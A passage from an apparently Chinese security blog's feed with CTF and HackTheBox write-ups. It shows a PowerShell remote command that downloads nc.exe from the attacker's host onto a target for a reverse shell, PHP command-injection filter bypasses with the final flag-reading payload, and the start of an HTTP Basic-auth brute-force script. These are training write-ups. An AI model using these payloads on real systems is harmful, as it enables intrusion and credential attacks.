&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; &amp;lt;PSCredential&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-DisableKeepAlive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Headers&lt;/span&gt; &amp;lt;IDictionary&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-InFile&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-MaximumRedirection&lt;/span&gt; &amp;lt;Int32&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Method&lt;/span&gt; &amp;lt;WebRequestMethod&amp;gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Default | Get | Head | Post | Put | Delete | Trace | Options | Merge | Patch&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-PassThru&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Proxy&lt;/span&gt; &amp;lt;Uri&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ProxyCredential&lt;/span&gt; &amp;lt;PSCredential&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ProxyUseDefaultCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-SessionVariable&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-TimeoutSec&lt;/span&gt; &amp;lt;Int32&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-TransferEncoding&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;chunked | compress | deflate | &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt; | identity&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-UseBasicParsing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-UseDefaultCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-UserAgent&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-WebSession&lt;/span&gt; &amp;lt;WebRequestSession&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &amp;lt;CommonParameters&amp;gt;]
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们先开启本地 kali 的 web 服务，将 nc.exe 放进对应文件夹，之后远程执行下列命令，从我们本地服务器将 nc 下载保存至用户 Chris 的目录下&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Invoke-Command &lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt; sniper &lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;hris&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.15.11/nc.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;hris&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ocuments&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;Invoke-WebRequest &lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Outfile&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcp0r35n46j31e80na0z9.jpg&quot; alt=&quot;image-20200310183924496&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再远程反弹 shell，成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcp0qosjh7j31e20gotfm.jpg&quot; alt=&quot;image-20200310184122085&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;

&lt;p&gt;上述即为整个越权反弹 shell 的内容，一些很基本的命令结合起来使用就能达到很神奇的效果。&lt;/p&gt;

</description>
        <pubDate>Tue, 10 Mar 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/10/PSCredential%E8%B6%8A%E6%9D%83%E5%8F%8D%E5%BC%B9shell/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/10/PSCredential%E8%B6%8A%E6%9D%83%E5%8F%8D%E5%BC%B9shell/</guid>
        
        <category>渗透测试</category>
        
        <category>WINDOWS 提权</category>
        
        
      </item>
    
      <item>
        <title>Hackthebox Nest writeup/Walkthrough/攻略</title>
        <description>
</description>
        <pubDate>Sun, 08 Mar 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/08/HTB-Nest/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/08/HTB-Nest/</guid>
        
        <category>HTB</category>
        
        <category>渗透测试</category>
        
        
      </item>
    
      <item>
        <title>jekyll实现博客文章加密功能</title>
        <description>
</description>
        <pubDate>Fri, 06 Mar 2020 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/06/jekyll%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/06/jekyll%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/</guid>
        
        <category>HTB</category>
        
        <category>渗透测试</category>
        
        
      </item>
    
      <item>
        <title>CTFHUB 技能树-Web-RCE-综合过滤 wp</title>
        <description>&lt;h2 id=&quot;题目考点&quot;&gt;题目考点&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;命令执行绕过&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;解题思路&quot;&gt;解题思路&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcjclhhorrj310y0u0jwt.jpg&quot; alt=&quot;Xnip2020-03-05_20-57-49&quot; /&gt;&lt;/p&gt;

&lt;p&gt;​		给了源码，发现过滤了 &lt;code class=&quot;highlighter-rouge&quot;&gt;| &amp;amp; ; 空格 cat flag ctfhub&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​		如果输入上述符号或命令，只会回显其本身而不会被执行，需要一个个绕过&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ip'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ip'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ip'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/(\||&amp;amp;|;| |\/|cat|flag|ctfhub)/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ping -c 4 &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;命令分隔符&quot;&gt;命令分隔符&lt;/h4&gt;

&lt;p&gt;​		因为 &lt;code class=&quot;highlighter-rouge&quot;&gt;| 和 ;&lt;/code&gt; 被过滤，首先要想办法分隔命令，可以使用多种绕过方法，一般用换行即 &lt;code class=&quot;highlighter-rouge&quot;&gt;%0a %0d&lt;/code&gt; 即可。当然，得抓包修改，直接敲在输入框里肯定不行。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcjcnz5t9dj31310u0qtk.jpg&quot; alt=&quot;Xnip2020-03-05_21-00-11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们发现 &lt;code class=&quot;highlighter-rouge&quot;&gt;flag_is_here&lt;/code&gt; 文件夹，下一步是想办法进去&lt;/p&gt;

&lt;h4 id=&quot;绕过空格&quot;&gt;绕过空格&lt;/h4&gt;

&lt;p&gt;方法很多，一般可以使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;${IFS}&lt;/code&gt;，更多请参考谷歌&lt;/p&gt;

&lt;h4 id=&quot;绕过黑名单&quot;&gt;绕过黑名单&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;拼接绕过&lt;/p&gt;

    &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hello world&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; flag
~&lt;span class=&quot;nv&quot;&gt;$ a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;c&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;at&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flag&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a$b&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;
hello world
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;单双引号&lt;/p&gt;

    &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;c&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;at f&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;lag
hello world
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;base64绕过&lt;/p&gt;

    &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Y2F0IGZsYWc=&quot;&lt;/span&gt;|base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
hello world
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcjcywtw6kj31cu0u0qkt.jpg&quot; alt=&quot;Xnip2020-03-05_21-10-57&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;找到 flag 文件，运用上述知识继续读 flag&lt;/p&gt;

    &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;o&quot;&gt;/?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;acd&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lag_is_here&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ac&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lag_244281822710491&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcjd2bvlntj31cl0u0ngq.jpg&quot; alt=&quot;Xnip2020-03-05_21-12-30&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Thu, 05 Mar 2020 05:20:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/05/CTFHUB-%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/05/CTFHUB-%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4/</guid>
        
        <category>CTFHUB</category>
        
        <category>writeup</category>
        
        
      </item>
    
      <item>
        <title>CTFHUB 技能树-Web-HTTP-基本认证 wp</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://www.ctfhub.com/#/index&quot;&gt;CTFHUB&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;题目考点&quot;&gt;题目考点&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Basic access authentication&lt;/li&gt;
  &lt;li&gt;脚本编写&lt;/li&gt;
  &lt;li&gt;爆破&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;解题思路&quot;&gt;解题思路&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;打开题目链接，发现需要输入用户名和密码才能访问&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzytsmeej31v20oygps.jpg&quot; alt=&quot;01&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;题目提供了常用密码top100，应该是爆破，&lt;del&gt;因为范围很小，所以我们一个个试就好了，&lt;/del&gt;所以我们可以编写简单脚本&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;写脚本前先了解一下基本认证是什么，照搬题目描述：“在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 https://zh.wikipedia.org/wiki/HTTP基本认证”&lt;/p&gt;

    &lt;p&gt;关键的地方如下：&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzyyr0iwj31ce0u01kx.jpg&quot; alt=&quot;02&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;使用 Burp 抓包，添加 Authorization 头字段，使用爆破模块&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzz2qgy5j312y0u01bx.jpg&quot; alt=&quot;03&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;其中，payload 部分编写脚本生成&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzz6i224j312y0u0e07.jpg&quot; alt=&quot;04&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;根据提示，容易猜测用户名为 admin，那么 Authorization 头字段的格式就应该为 &lt;code class=&quot;highlighter-rouge&quot;&gt;Authorization: Basic [base64(admin:密码)]&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzzb1wfjj312y0u0tyd.jpg&quot; alt=&quot;05&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;通过以下脚本将提供的密码列表按格式生成好&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
   
&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/Users/wujing/Downloads/10_million_password_list_top_100.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
